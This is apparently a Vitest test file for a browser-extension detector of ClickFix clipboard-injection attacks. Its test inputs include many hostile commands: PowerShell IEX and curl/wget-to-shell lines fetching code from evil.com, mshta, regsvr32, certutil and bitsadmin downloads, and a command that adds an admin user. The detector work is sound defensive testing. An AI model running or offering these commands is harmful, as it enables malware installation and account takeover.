/**
 * extension/__tests__/clickfix_clipboard_defender.test.js
 *
 * Tests for ClickFixClipboardDefender — clipboard injection attack detector.
 *
 * jsdom limitations:
 *   - Clipboard API is limited; navigator.clipboard.writeText mocked manually.
 *   - Object.defineProperty on navigator.clipboard may behave differently.
 */

import { describe, it, expect, beforeEach, vi } from 'vitest';

// Mock chrome APIs before importing the module
const mockSendMessage = vi.fn();
vi.stubGlobal('chrome', {
  runtime: {
    id: 'test-extension-id',
    sendMessage: mockSendMessage,
  },
});

import {
  checkPayloadSignals,
  checkPageContextSignals,
  calculateClickFixRiskScore,
  injectClickFixWarningBanner,
  installClipboardInterceptor,
} from '../content/clickfix_clipboard_defender.js';

beforeEach(() => {
  document.body.innerHTML = '';
  document.getElementById('phishops-clickfix-warning')?.remove();
  vi.clearAllMocks();
});

// =========================================================================
// checkPayloadSignals
// =========================================================================

describe('checkPayloadSignals', () => {
  it('detects powershell commands', () => {
    const signals = checkPayloadSignals('powershell -enc SQBFAFgA...');
    const ids = signals.map(s => s.id);
    expect(ids).toContain('clickfix:powershell_pattern');
  });

  it('detects pwsh variant', () => {
    const signals = checkPayloadSignals('pwsh -Command "Get-Process"');
    expect(signals.some(s => s.id === 'clickfix:powershell_pattern')).toBe(true);
  });

  it('detects Invoke-Expression (IEX)', () => {
    const signals = checkPayloadSignals('IEX (New-Object Net.WebClient).DownloadString("http://evil.com/a.ps1")');
    expect(signals.some(s => s.id === 'clickfix:powershell_pattern')).toBe(true);
  });

  it('detects Invoke-WebRequest', () => {
    const signals = checkPayloadSignals('Invoke-WebRequest -Uri http://evil.com/payload.exe -OutFile C:\\temp\\payload.exe');
    expect(signals.some(s => s.id === 'clickfix:powershell_pattern')).toBe(true);
  });

  it('detects cmd /c execution', () => {
    const signals = checkPayloadSignals('cmd /c whoami && net user');
    expect(signals.some(s => s.id === 'clickfix:cmd_execution')).toBe(true);
  });

  it('detects cmd.exe execution', () => {
    const signals = checkPayloadSignals('cmd.exe /c net localgroup administrators');
    expect(signals.some(s => s.id === 'clickfix:cmd_execution')).toBe(true);
  });

  it('detects mshta execution', () => {
    const signals = checkPayloadSignals('mshta http://evil.com/payload.hta');
    expect(signals.some(s => s.id === 'clickfix:cmd_execution')).toBe(true);
  });

  it('detects wscript execution', () => {
    const signals = checkPayloadSignals('wscript C:\\temp\\evil.vbs');
    expect(signals.some(s => s.id === 'clickfix:cmd_execution')).toBe(true);
  });

  it('detects cscript execution', () => {
    const signals = checkPayloadSignals('cscript //NoLogo C:\\temp\\evil.js');
    expect(signals.some(s => s.id === 'clickfix:cmd_execution')).toBe(true);
  });

  it('detects regsvr32 execution', () => {
    const signals = checkPayloadSignals('regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll');
    expect(signals.some(s => s.id === 'clickfix:cmd_execution')).toBe(true);
  });

  it('detects curl download', () => {
    const signals = checkPayloadSignals('curl -o /tmp/payload http://evil.com/malware');
    expect(signals.some(s => s.id === 'clickfix:curl_wget_download')).toBe(true);
  });

  it('detects wget download', () => {
    const signals = checkPayloadSignals('wget http://evil.com/malware -O /tmp/payload');
    expect(signals.some(s => s.id === 'clickfix:curl_wget_download')).toBe(true);
  });

  it('detects certutil -urlcache', () => {
    const signals = checkPayloadSignals('certutil -urlcache -split -f http://evil.com/payload.exe');
    expect(signals.some(s => s.id === 'clickfix:curl_wget_download')).toBe(true);
  });

  it('detects bitsadmin download', () => {
    const signals = checkPayloadSignals('bitsadmin /transfer job http://evil.com/payload.exe C:\\temp\\payload.exe');
    expect(signals.some(s => s.id === 'clickfix:curl_wget_download')).toBe(true);
  });

  it('detects pipe to bash', () => {
    const signals = checkPayloadSignals('curl http://evil.com/script.sh | bash');
    expect(signals.some(s => s.id === 'clickfix:pipe_to_shell')).toBe(true);
  });

  it('detects pipe to sh', () => {
    const signals = checkPayloadSignals('wget -qO- http://evil.com/script.sh | sh');
    expect(signals.some(s => s.id === 'clickfix:pipe_to_shell')).toBe(true);
  });

  it('detects pipe to python', () => {
    const signals = checkPayloadSignals('curl http://evil.com/script.py | python');
    expect(signals.some(s => s.id === 'clickfix:pipe_to_shell')).toBe(true);
  });

  it('detects pipe to iex', () => {
    const signals = checkPayloadSignals("(New-Object Net.WebClient).DownloadString('http://evil.com') | iex");
    expect(signals.some(s => s.id === 'clickfix:pipe_to_shell')).toBe(true);
  });

  it('detects base64 payload (40+ chars)', () => {
    const b64 = 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA';
    const signals = checkPayloadSignals(`powershell -enc ${b64}`);
    expect(signals.some(s => s.id === 'clickfix:base64_payload')).toBe(true);
  });

  it('returns empty for benign text', () => {
    const signals = checkPayloadSignals('Hello world, this is a normal sentence with no commands.');
    expect(signals).toHaveLength(0);
  });

  it('returns empty for short base64 (under 40 chars)', () => {
    const signals = checkPayloadSignals('aGVsbG8gd29ybGQ=');
    expect(signals.some(s => s.id === 'clickfix:base64_payload')).toBe(false);
  });

  it('detects multiple signals in one payload', () => {
    const payload = 'powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA';
    const signals = checkPayloadSignals(payload);
    expect(signals.length).toBeGreaterThanOrEqual(2);
  });
});

// =========================================================================
// checkPageContextSignals
// =========================================================================

describe('checkPageContextSignals', () => {
  it('detects Win+R instruction text', () => {
    document.body.innerHTML = '<p>Press Win+R to open the Run dialog, then paste the command.</p>';
    const signals = checkPageContextSignals();
    expect(signals.some(s => s.id === 'clickfix:run_dialog_instruction')).toBe(true);
  });

  it('detects "Run dialog" text', () => {
    document.body.innerHTML = '<p>Open the Run dialog and paste this command.</p>';
    const signals = checkPageContextSignals();
    expect(signals.some(s => s.id === 'clickfix:run_dialog_instruction')).toBe(true);
  });

  it('detects Ctrl+V instruction text', () => {
    document.body.innerHTML = '<p>Now press Ctrl+V and hit Enter to continue.</p>';
    const signals = checkPageContextSignals();
    expect(signals.some(s => s.id === 'clickfix:run_dialog_instruction')).toBe(true);
  });

  it('detects fake CAPTCHA "I\'m not a robot"', () => {
    document.body.innerHTML = '<div>Click to verify: I\'m not a robot</div>';
    const signals = checkPageContextSignals();
    expect(signals.some(s => s.id === 'clickfix:fake_captcha_context')).toBe(true);
  });

  it('detects "Verify you are human"', () => {
    document.body.innerHTML = '<h2>Verify you are human</h2><button>Click here</button>';
    const signals = checkPageContextSignals();
    expect(signals.some(s => s.id === 'clickfix:fake_captcha_context')).toBe(true);
  });

  it('detects "human verification"', () => {
    document.body.innerHTML = '<div>Human Verification Required</div>';
    const signals = checkPageContextSignals();
    expect(signals.some(s => s.id === 'clickfix:fake_captcha_context')).toBe(true);
  });

  it('does NOT detect fake CAPTCHA when real reCAPTCHA iframe is present', () => {
    document.body.innerHTML = `
      <iframe src="https://www.google.com/recaptcha/api2/anchor"></iframe>
      <div>I'm not a robot</div>
    `;
    const signals = checkPageContextSignals();
    expect(signals.some(s => s.id === 'clickfix:fake_captcha_context')).toBe(false);
  });

  it('does NOT detect fake CAPTCHA when g-recaptcha class is present', () => {
    document.body.innerHTML = `
      <div class="g-recaptcha"></div>
      <div>Verify you are human</div>
    `;
    const signals = checkPageContextSignals();
    expect(signals.some(s => s.id === 'clickfix:fake_captcha_context')).toBe(false);
  });

  it('returns empty for a clean page', () => {
    document.body.innerHTML = '<h1>Welcome to our website</h1><p>Normal content here.</p>';
    const signals = checkPageContextSignals();
    expect(signals).toHaveLength(0);
  });
});

// =========================================================================
// calculateClickFixRiskScore
// =========================================================================

describe('calculateClickFixRiskScore', () => {
  it('returns 0.0 for empty signals', () => {
    const { riskScore, signalList } = calculateClickFixRiskScore([]);
    expect(riskScore).toBe(0.0);
    expect(signalList).toHaveLength(0);
  });

  it('returns correct score for a single signal', () => {
    const { riskScore } = calculateClickFixRiskScore([
      { id: 'clickfix:powershell_pattern', weight: 0.45 },
    ]);
    expect(riskScore).toBe(0.45);
  });

  it('sums multiple signals', () => {
    const { riskScore, signalList } = calculateClickFixRiskScore([
      { id: 'clickfix:powershell_pattern', weight: 0.45 },
      { id: 'clickfix:base64_payload', weight: 0.30 },
    ]);
    expect(riskScore).toBe(0.75);
    expect(signalList).toHaveLength(2);
  });

  it('caps at 1.0', () => {
    const { riskScore } = calculateClickFixRiskScore([
      { id: 'clickfix:powershell_pattern', weight: 0.45 },
      { id: 'clickfix:pipe_to_shell', weight: 0.40 },
      { id: 'clickfix:base64_payload', weight: 0.30 },
    ]);
    expect(riskScore).toBe(1.0);
  });

  it('alert threshold is 0.50', () => {
    const { riskScore } = calculateClickFixRiskScore([
      { id: 'clickfix:powershell_pattern', weight: 0.45 },
      { id: 'clickfix:fake_captcha_context', weight: 0.15 },
    ]);
    expect(riskScore).toBe(0.60);
    expect(riskScore).toBeGreaterThanOrEqual(0.50);
  });

  it('block threshold is 0.65', () => {
    const { riskScore } = calculateClickFixRiskScore([
      { id: 'clickfix:powershell_pattern', weight: 0.45 },
      { id: 'clickfix:run_dialog_instruction', weight: 0.20 },
    ]);
    expect(riskScore).toBe(0.65);
    expect(riskScore).toBeGreaterThanOrEqual(0.65);
  });

  it('includes all signal IDs in signalList', () => {
    const { signalList } = calculateClickFixRiskScore([
      { id: 'clickfix:cmd_execution', weight: 0.40 },
      { id: 'clickfix:curl_wget_download', weight: 0.35 },
    ]);
    expect(signalList).toEqual(['clickfix:cmd_execution', 'clickfix:curl_wget_download']);
  });
});

// =========================================================================
// injectClickFixWarningBanner
// =========================================================================

describe('injectClickFixWarningBanner', () => {
  it('injects a banner into the DOM', () => {
    injectClickFixWarningBanner(0.75, 'powershell -enc AAAA', ['clickfix:powershell_pattern']);
    const banner = document.getElementById('phishops-clickfix-warning');
    expect(banner).not.toBeNull();
    expect(banner.getAttribute('role')).toBe('alert');
  });

  it('is idempotent — does not inject twice', () => {
    injectClickFixWarningBanner(0.75, 'test', ['clickfix:powershell_pattern']);
    injectClickFixWarningBanner(0.80, 'test', ['clickfix:cmd_execution']);
    const banners = document.querySelectorAll('#phishops-clickfix-warning');
    expect(banners).toHaveLength(1);
  });

  it('displays the risk score', () => {
    injectClickFixWarningBanner(0.85, 'test payload', ['clickfix:powershell_pattern']);
    const banner = document.getElementById('phishops-clickfix-warning');
    expect(banner.textContent).toContain('0.85');
  });

  it('displays a payload snippet', () => {
    injectClickFixWarningBanner(0.75, 'powershell -enc dangerous_command_here', ['clickfix:powershell_pattern']);
    const banner = document.getElementById('phishops-clickfix-warning');
    expect(banner.textContent).toContain('powershell -enc dangerous_command_here');
  });

  it('truncates long payloads', () => {
    const longPayload = 'A'.repeat(200);
    injectClickFixWarningBanner(0.75, longPayload, ['clickfix:powershell_pattern']);
    const banner = document.getElementById('phishops-clickfix-warning');
    // Should contain the ellipsis indicator
    expect(banner.innerHTML).toContain('\u2026');
  });

  it('dismiss button removes the banner', () => {
    injectClickFixWarningBanner(0.75, 'test', ['clickfix:powershell_pattern']);
    const dismissBtn = document.getElementById('phishops-clickfix-dismiss');
    expect(dismissBtn).not.toBeNull();
    dismissBtn.click();
    expect(document.getElementById('phishops-clickfix-warning')).toBeNull();
  });

  it('contains clickfix-specific title text', () => {
    injectClickFixWarningBanner(0.75, 'test', ['clickfix:powershell_pattern']);
    const banner = document.getElementById('phishops-clickfix-warning');
    expect(banner.textContent).toContain('clickfix clipboard attack blocked');
  });
});

// =========================================================================
// installClipboardInterceptor
// =========================================================================

describe('installClipboardInterceptor', () => {
  let originalWriteText;

  beforeEach(() => {
    // Set up a mock clipboard API
    originalWriteText = vi.fn().mockResolvedValue(undefined);
    const clipboardObj = {
      writeText: originalWriteText,
    };
    Object.defineProperty(navigator, 'clipboard', {
      value: clipboardObj,
      writable: true,
      configurable: true,
    });
    // Reset the banner
    document.getElementById('phishops-clickfix-warning')?.remove();
  });

  it('installs without error', () => {
    expect(() => installClipboardInterceptor()).not.toThrow();
  });

  it('allows benign clipboard writes through', async () => {
    installClipboardInterceptor();
    // Need to bypass the short payload check
    const benignText = 'This is a perfectly normal sentence that a user might copy from a webpage.';
    await navigator.clipboard.writeText(benignText);
    expect(originalWriteText).toHaveBeenCalledWith(benignText);
  });

  it('allows short payloads through without analysis', async () => {
    installClipboardInterceptor();
    await navigator.clipboard.writeText('hello');
    expect(originalWriteText).toHaveBeenCalledWith('hello');
  });

  it('blocks malicious powershell payload and sends telemetry', async () => {
    installClipboardInterceptor();
    const malicious = 'powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA';
    await expect(navigator.clipboard.writeText(malicious)).rejects.toThrow('Clipboard write blocked');
    expect(mockSendMessage).toHaveBeenCalled();
    const call = mockSendMessage.mock.calls[0][0];
    expect(call.type).toBe('CLICKFIX_CLIPBOARD_EVENT');
    expect(call.payload.eventType).toBe('CLICKFIX_CLIPBOARD_INJECTION');
    expect(call.payload.action).toBe('blocked');
  });

  it('sends alert telemetry for medium-risk payloads', async () => {
    installClipboardInterceptor();
    // cmd /c alone = 0.40 + curl = 0.35 = 0.75, but let's use something that hits alert but maybe not block
    // Actually cmd /c = 0.40, which alone is < 0.50 alert. Need to combine.
    // Let's add page context: set up a page with "Win+R"
    document.body.innerHTML = '<p>Press Win+R and paste this command</p>';
    const payload = 'cmd /c net user hacker Password123 /add && net localgroup administrators hacker /add';
    // cmd /c = 0.40 + page context run_dialog = 0.20 = 0.60 which is >= 0.50 alert but < 0.65 block
    await navigator.clipboard.writeText(payload);
    expect(originalWriteText).toHaveBeenCalledWith(payload);
    expect(mockSendMessage).toHaveBeenCalled();
    const call = mockSendMessage.mock.calls[0][0];
    expect(call.payload.action).toBe('alerted');
  });
});
